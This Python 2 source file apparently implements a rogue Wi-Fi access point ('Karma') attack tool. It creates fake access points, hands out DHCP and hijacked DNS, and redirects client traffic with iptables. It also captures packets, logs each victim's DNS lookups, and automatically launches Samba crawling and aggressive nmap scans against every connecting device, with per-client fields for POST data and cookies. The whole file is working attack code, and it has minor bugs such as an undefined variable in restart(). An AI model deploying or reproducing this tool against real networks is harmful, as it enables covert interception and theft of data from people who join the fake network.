from threading import Lock,Thread
import time,random,re,tempfile
from select import select
import subprocess
import os
from datetime import datetime
import random
from SambaCrawler import *
from Utils import *

class VirtualInterface(Thread):
  def __init__(self,ap, iface,bssid, essid, fishing):
    Thread.__init__(self)
    self.clients = {}
    self.ap = ap
    self.bssid = bssid
    self.karma = ap.karma
    self.iface = iface
    self.essid = essid
    self.unused = True
    self.activity_ts = time.time()
    subnet = self.karma.get_unique_subnet()
    self.subnet = None
    self.setup_iface(iface,subnet)

    self.dhcpd_process = self.start_dhcpd(iface,subnet)

    self.nmaps = []

    # will run in main loop
    self.iw_monitoring_processes = []
    self.iw_monitoring_timeout = None
    
    if self.karma.tcpdump:
      self.tcpdump_process = self.start_tcp_dump()
    else:
      self.tcpdump_process = None

    if fishing:
      # allow DNS
      self.setup_allow(iface, 'udp', 53)
      self.setup_allow(iface, 'tcp', 53)
      # allow DHCP
      self.setup_allow(iface, 'udp', 67)
      # redirect the following ports
      for sport, dport in self.karma.redirections.iteritems():
        self.setup_allow(iface,'tcp',dport)
        self.setup_redirections(iface,sport,dport)
      self.connectionwatch_process = self.start_connectionwatch(iface)

      # block all input packets
      self.setup_block_all(iface)

    else:
      self.connectionwatch_process = None
  
  def start_connectionwatch(self, iface):
    cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","arp","or","udp","port","53"]
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p
  
  def start_tcp_dump(self):
    self.logfile = os.path.join(self.karma.logpath,"wifi-%s-%s.cap"%(self.essid,datetime.now().strftime("%Y%m%d-%H%M%S")))
    self.karma.log( "[+] Starting tcpdump %s"%self.logfile )
    cmd = ['tcpdump']
    cmd.append('-i')
    cmd.append(self.iface)
    cmd.append('-w')
    cmd.append(self.logfile)
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p
            
  def client_ping(self, mac):
    self.clients[mac]['last_activity'] = time.time()
  
  def register_client(self, mac,ip, name = ""):
    if not self.clients.has_key(mac) and not mac in self.karma.get_ignore_bssid():
      self.karma.total_client_count += 1
      self.unused = False
      self.clients[mac] = {'ip':ip, 'post':[], 'name': name, 'cookies':[],'last_activity': time.time()}
      self.karma.log( "new client %s (%s) %s"%(mac, ctxt(ip, GREEN), name))
      self.karma.db.new_dhcp_lease(mac, ip, name)
      smb = SambaCrawler(self.karma, ip, 'smb_%s'%mac)
      smb.start()
      if self.karma.scan:
        try:
          self.nmaps.append(self.nmap(ip))
        except:
          self.karma.log( "%s Unable to start nmap %s"%(ctxt("[!]",RED)) )
  
  
  def stop(self):
    return self.killall()
  
  def killall(self):
    self.status = 'stopped'
    self.activity_ts = None
      
    try:
      self.dhcpd_process.kill()
      self.dhcpd_process.wait()
    except:
      self.karma.log( "%s could not kill dhcpd"%ctxt("[!]",RED))
    if self.tcpdump_process is not None:
      try:
        self.tcpdump_process.kill()
        self.tcpdump_process.wait()
      except:
        self.karma.log( "%s could not kill tcpdump"%ctxt("[!]",RED))
      if self.karma.tcpdump and self.unused and not self.karma.debug and not self.karma.wpa:
        try:
          self.karma.log( "[-] deleting %s"%self.logfile)
          os.remove(self.logfile)
        except:
          self.karma.log( "%s error deleteting %s"%((ctxt("[!]",RED)), self.logfile))
          pass
    if self.connectionwatch_process is not None:
      try:
        self.connectionwatch_process.kill()
        self.connectionwatch_process.wait()
      except:
        self.karma.log( "%s could not kill connectionwatch"%ctxt("[!]",RED))
    
    #clear route cache
    cmd = ["ip", "route", "del", self.subnet.range_null()]
    p = subprocess.Popen(cmd)
    p.wait()
    
    for p in self.nmaps:
      p.kill()
      p.wait()
    try:
      for e in self.essid:
        self.karma.release_ap(self.e)
    except:
      pass
    self.karma.free_subnet(self.subnet)
  
  def run(self):
    set_title('virtual %s'%self.essid)
    self.status = 'running'
    self.karma.log( "[+] now running" )
        
    #precompile regexp
    dhcp_failed_re = re.compile(r".*failed.*\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
    dhcpack_re = re.compile(r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*")
    cname_watch_re = re.compile(r".* > (\w+:\w+:\w+:\w+:\w+:\w+).*CNAME*\s([a-z0-9-\.]+)\..*")
    aaaa_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) >.*length \d+:\s([0-9\.]+)\.\d+.*A\?*\s([a-z0-9-\.]+)\..*")
    arp_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) > .*\b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b tell \b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b")
    iwmon_station_re = re.compile(r"Station (\w+:\w+:\w+:\w+:\w+:\w+) \(on \w+\)")
    iwmon_kv_re = re.compile(r"\s*(.+):(.+?)$")
    while True:
      
      # check alive
      if self.activity_ts is None:
        self.karma.log( "%s Stopping %s"%(ctxt("[-]",GREEN),self.essid))
        return
      
      # update RSSI
      if self.iw_monitoring_is_done():
        # start new monitoring processes
        self.start_all_iw_monitoring()

      files = []
      
      dhcpfd = self.dhcpd_process.stderr.fileno()
      files.append(dhcpfd)
    
      if self.connectionwatch_process is not None:
        connwfd = self.connectionwatch_process.stdout.fileno()
        files.append(connwfd)

      iwmonfds = [p.stdout.fileno() for p in self.iw_monitoring_processes]
      files.extend(iwmonfds)
      
      nmapsd = []
      for n in self.nmaps:
        nmapsd.append(n.stdout.fileno())
      files.extend(nmapsd)
      rlist,wlist,xlist = select(files,[],[],1)
      i = 0
      for n in nmapsd:
        if n in rlist:
          lr = LineReader(self.nmaps[i].stdout.fileno())
          lines = lr.readlines()
          for line in lines:
            if len(line) != 0:
              print line
        i += 1
        
      if dhcpfd in rlist:
        lr = LineReader(self.dhcpd_process.stderr.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            #print "dnsmasq  %s"%line
            m = dhcp_failed_re.match(line)
            if m is not None:
              self.karma.log( "%s %s"%(ctxt("[!]",RED), line))
              self.killall()
              return
            else:
              m = dhcpack_re.match(line)
              if m is not None:
                ip,mac,name = m.groups()
                self.register_client(mac, ip, name)
              #else:
                # this regexp seems to be really slow
                #m = disassociated_re.match(line)
                ##print "000022"
                #if m is not None:
                  #mac = m.groups()
                  #self.karma.log( "dissociated %s"%mac)
                  #self.clients.pop(mac,None)

      if connwfd in rlist:
        lr = LineReader(self.connectionwatch_process.stdout.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            #print "dnswatch %s"%line
            dns = {}
            # only show requests
            if "CNAME" in line:
              m = cname_watch_re.match(line)
              if m is not None:
                mac,host = m.groups()
                dns = {
                  'qtype':'CNAME',
                  'bssid': mac,
                  'host': host
                  }
            else:
              got_aaaa = "AAAA?" in line
              got_a =    "A?" in line

              if got_aaaa or got_a:
                m = aaaa_watch_re.match(line)
                if m is not None:
                  mac, ip, host = m.groups()
                  dns = {
                    'qtype': 'AAAA' if got_aaaa else 'A',
                    'bssid': mac,
                    'host': host
                    }
                  self.register_client(mac,ip)
              else:
                #check for gratuitous arp
                m = arp_watch_re.match(line)
                if m is not None:
                  mac, ipsrc, ipdst = m.groups()
                  if ipsrc == ipdst and mac not in self.karma.get_ignore_bssid():
                    self.karma.log("%s Gratuitous arp from %s to %s"%(self.essid, ctxt(mac,GREEN), ctxt(ipdst,GREEN)))
                    subnet_base = "%s.%%d"%('.'.join(ipsrc.split('.')[:3]))
                    subnet = IPSubnet(subnet_base)
                    #if self.subnet.gateway() != subnet.gateway():
                      #self.karma.log("[+] switching to %s"%(ctxt(subnet.gateway(), GREEN)))
                      #self.setup_iface(self.ifhostapd.iface,subnet)
                    self.register_client(mac,ipsrc)
            if dns != {}:
              if dns['bssid'] not in self.karma.get_ignore_bssid():
                self.client_ping(dns['bssid'])
                self.karma.update_dns(dns)
                self.karma.log( "%s %s"%(self.essid, 
                  ctxt("%s => %s"%(dns['bssid'], dns['host']),GREY)))
            self.activity_ts = time.time()

      for iwmonfd in iwmonfds:
        if iwmonfd in rlist:
          lr = LineReader(iwmonfd)
          lines = lr.readlines()

          kvs = {}
          station = None
          for line in lines:
            m = iwmon_station_re.match(line)
            if m is not None:
              station, = m.groups()
            else:
              m = iwmon_kv_re.match(line)
              if m is not None:
                k,v = m.groups()
                k = k.strip(" \t")
                v = v.strip(" \t")
                mac = station.lower()
                if mac in self.clients:
                  if 'iwinfos' in self.clients[mac]:
                    self.clients[mac]['iwinfos'][k] = v
                  else:
                    self.clients[mac]['iwinfos'] = {k:v}

  def iw_monitoring_is_done(self):
    tbrm = []
    for p in self.iw_monitoring_processes:
      if p.poll() is not None:
        # process has ended
        tbrm.append(p)
    
    # remove processes from list
    for p in tbrm:
      self.iw_monitoring_processes.remove(p)

    n = len(self.iw_monitoring_processes)
    if self.iw_monitoring_timeout is None:
      if n == 0:
        self.iw_monitoring_timeout = time.time()

    elif time.time() - self.iw_monitoring_timeout > 1.0:
      return True

    return False

  def start_all_iw_monitoring(self):
    self.iw_monitoring_timeout = None
    self.iw_monitoring_processes = [
      self.start_iw_monitoring(self.iface)
    ]

  def start_iw_monitoring(self, iface):
    cmd = ['iw','dev',iface,'station','dump']

    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p

  def start_dhcpd(self, iface, subnet):
    # create a temporary file
    self.karma.log( "[+] Starting dhcp server %s %s"%(iface,subnet.range()))

    cmd = ['dnsmasq',
      '-d',
      '--log-dhcp',
      '--bind-dynamic',
      '--log-facility=-',
      '-i', iface,
      '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
      '--dhcp-option=option:router,%s'%(subnet.gateway()),
      '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
    ]
      
    if(self.karma.offline):
      cmd.append('-R')
      # https://technet.microsoft.com/en-us/library/cc732049%28v=ws.10%29.aspx
      cmd.append('--address=/dns.msftncsi.com/131.107.255.255')
      cmd.append('--address=/#/%s'%(subnet.gateway()))
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p

  def setup_iface(self, iface, subnet):
    self.subnet = subnet
    self.karma.log( "[+] Uping iface %s w/ subnet %s"%(iface,subnet.range()))
    iprange = "%s"%subnet.range()
    cmd = ["ifconfig",iface,iprange]
    p = subprocess.Popen(cmd)
    p.wait()

  def nmap(self, ip):
    self.karma.log( "[+] nmapping %s"%ip)
    cmd = ['nmap', '-Pn', '-T5', '--open', '-A', "%s"%ip]
    p = subprocess.Popen(cmd
    ,stdout=subprocess.PIPE
    ,stderr=subprocess.PIPE
    )
    return p
    

  def setup_iptables(self, cmd):
    cmd = ['iptables',] + cmd
    if self.karma.debug:
      self.karma.log('[?] %s'%(' '.join(cmd)))
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    p.wait()
    return p

  def setup_block_all(self, iface):
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-m','conntrack',
      '-j','ACCEPT',
      '--ctstate','RELATED,ESTABLISHED',
    ])
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-j','DROP'])
    self.setup_iptables([
      '-A','OUTPUT',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','OUTPUT',
      '-i',iface,
      '-j','DROP'])
    self.setup_iptables([
      '-A','FORWARD',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','FORWARD',
      '-i',iface,
        '-j','DROP'])

  def setup_allow(self, iface, proto, port):
    return self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-p',proto,
      '--dport',str(port),
      '-j','ACCEPT'])

  def setup_redirections(self, iface, inport, outport):
    self.setup_iptables([
      '-A', 'PREROUTING',
      '-i', iface,
      '-t', 'nat',
      '-p', 'tcp',
      '--dport', str(inport),
      '-j', 'REDIRECT',
      '--to-port', str(outport),
      ])


class AccessPoint(Thread):
  def __init__(self, karma, ifhostapd, aps, timeout = 30, fishing=True):
    Thread.__init__(self)
    self.status = 'creating'
    self.aps  = aps
    self.karma = karma
    self.timeout = timeout
    self.ifhostapd = ifhostapd
    self.ifaces = []
    self.unused = True
    self.logfile = None
    
    for ap in self.aps:
      if ap['bssid'] is None:
        ap['bssid'] = self.get_random_bssid()
    
    self.ifaces,self.hostapd_process = self.create_hostapd_access_point()
    self.virtuals = []
    for iface, essid in self.ifaces.iteritems():
      bssid = 'TO_DO'
      self.virtuals.append(VirtualInterface(self, iface, bssid, essid, fishing))

  def get_random_bssid(self):
    realmac = self.karma.getMacFromIface(self.ifhostapd.str()).split(':')
    
    
    return "%s:%s:%s:%02x:%02x:%02x" % (
        realmac[0], realmac[1], realmac[2],
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        )

  def stop(self):
    try:
      self.hostapd_process.kill()
      self.hostapd_process.wait()
      time.sleep(0.5)
    except:
      self.karma.log( "%s could not kill hostapd"%ctxt("[!]",RED))

  def run(self):
    for v in self.virtuals:
      v.start()
    
    hostapd_log = None
    keep_hostapd_log = False
    
    path = os.path.join(self.karma.logpath,"hostapd_%s_%s"%(self.get_essid(),datetime.now().strftime("%Y%m%d-%H%M%S")))
    hostapd_log = open(path,'w')
    
    files = []
    airfd = self.hostapd_process.stdout.fileno()
    files.append(airfd)
    
    disassociated_re = re.compile(r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*")
    authenticated_re = re.compile(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated")
    hostapd_fails_re = re.compile(r".*: Interface (\w+) wasn't started")
    hostapd_unavailable_re = re.compile(r"(\w+): Event INTERFACE_UNAVAILABLE \(31\) received")

    
    while True:
      for v in self.virtuals:
        stop = True
        if v.activity_ts is None:
          stop = True
        else:
          if time.time() - v.activity_ts < self.timeout:
            stop = False
          
      if stop:
        break
      self.hostapd_process.poll()
      if self.hostapd_process.returncode is not None:
        break
      rlist,wlist,xlist = select(files,[],[],1)
      if airfd in rlist:
        lr = LineReader(self.hostapd_process.stdout.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            if hostapd_log is not None:
              hostapd_log.write("%s\n"%line)
            #print "hostapd  %s"%line
            m = authenticated_re.match(line)
            if m is not None:
              mac, = m.groups()
              for v in self.virtuals:
                if not v.clients.has_key(mac) and not mac in self.karma.get_ignore_bssid():
                  self.karma.log( "Client %s associated to %s"%(ctxt(mac,GREEN),ctxt(self.get_essid(),GREEN)))
                  if mac not in self.karma.get_ignore_bssid():
                    self.karma.db.new_ap_connection(v.bssid, v.essid, mac)
                    self.unused = False

            else:
              r = hostapd_unavailable_re.match(line)
              r1 = hostapd_fails_re.match(line)
              m = None
              if r is not None:
                m = r
              if r1 is not None:
                m = r
              if m is not None:
                keep_hostapd_log = True
                ifname, = m.groups()
                self.karma.log( "%s Unable to start hostapd on interface %s: %s"%(ctxt("[!]",RED),ctxt(ifname,RED), line))
                self.restart()
      
    print "no more hostapd"
    hostapd_log.close()
    if not (self.karma.debug or keep_hostapd_log):
      os.remove(hostapd_log.name)
    for v in self.virtuals:
      v.stop()
    for v in self.virtuals:
      v.join()
      
    cmd = ["iwconfig", self.ifhostapd.str(), "mode", 'managed']
    p = subprocess.Popen(cmd)
    p.wait()
    self.karma.ifhostapds.free_one(self.ifhostapd)

  def restart(self):
    # will remove AP from list on next check
    if self.karma.debug:
      print hostapd_error

  def get_essid(self):
    essids = []
    for ap in self.aps:
      essids.append(ap['essid'])
    return '-'.join(essids)

  def get_bssid(self):
    bssids = []
    for ap in self.aps:
      bssids.append(ap['bssid'])
    return '-'.join(bssids)

  def create_hostapd_access_point(self):
    text = ' creating '
    for ap in self.aps:
      text += ' %s:%s:%s'%(ctxt(ap['essid'],GREEN), ap['bssid'], ap['wpa'])
    self.karma.log( "[+] Creating (hostapd) AP %s"% text)
    ifaces = {}
    interface = self.ifhostapd.str()    
    
    #there is at least one ap
    ap = self.aps[0]
    
    channel = random.randint(1,11)
    
    # for multiple essid in one iface, one channel may be specified by "iw list"
    if len(self.aps) > 1:
      channel = 1
      if ap['bssid'][-1] != '0':
        ap['bssid'] = ap['bssid'][:-1] + '0'
    
    ifaces[interface] = ap['essid']
    
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write('driver=nl80211\n')
    
    f.write("interface=%s\n"%(interface))
    f.write("ssid=%s\n"%(ap['essid']))
    f.write("bssid=%s\n"%(ap['bssid']))
    f.write("channel=%s\n"%(channel))
    #f.write("hw_mode=g\n")
    #f.write("ieee80211n=1\n")
    if ap['wpa'] is not None:
      f.write("wpa=2\n")
      f.write("wpa_passphrase=%s\n"%ap['wpa'])
      f.write("wpa_key_mgmt=WPA-PSK\n")
      f.write("wpa_pairwise=CCMP\n")
      f.write("rsn_pairwise=CCMP\n")
    
    i = 0
    for ap in self.aps[1:]:
      new_interface = "%s_%s"%(interface[-3:], i)
      ifaces[new_interface] = ap['essid']
      f.write("bss=%s\n"%new_interface)
      
      #may fail on some devices
      #f.write("bssid=%s\n"%(ap['bssid']))
      f.write("ssid=%s\n"%ap['essid'])
      if ap['wpa'] is not None:
        f.write("wpa=2\n")
        f.write("wpa_passphrase=%s\n"%ap['wpa'])
        f.write("wpa_key_mgmt=WPA-PSK\n")
        f.write("wpa_pairwise=CCMP\n")
        f.write("rsn_pairwise=CCMP\n")
      i += 1
    
    f.close()
    
    exe = "hostapd"
    if self.karma.args.hostapd is not None:
      exe = self.karma.args.hostapd
    
    cmd = [exe,"-d",f.name]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return ifaces,p

  def create_airbase_access_point(self):
    ap = self.aps[0]
    if len(self.aps) > 1:
      self.karma.log( "[!] Warning, only the first ap will be created")
    self.karma.log( "[+] Creating (airbase) AP %s"%ap['essid'])
    cmd = ["airbase-ng",
      "--essid", "%s"%ap['essid'],
      "-c","4",
      "-I","2000",
      self.karma.ifmon]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

    while True:
      line = p.stdout.readline()
      m = re.match(r".*Created tap interface (\w+)",line)
      if m is not None:
        iface, = m.groups()
        return iface,p
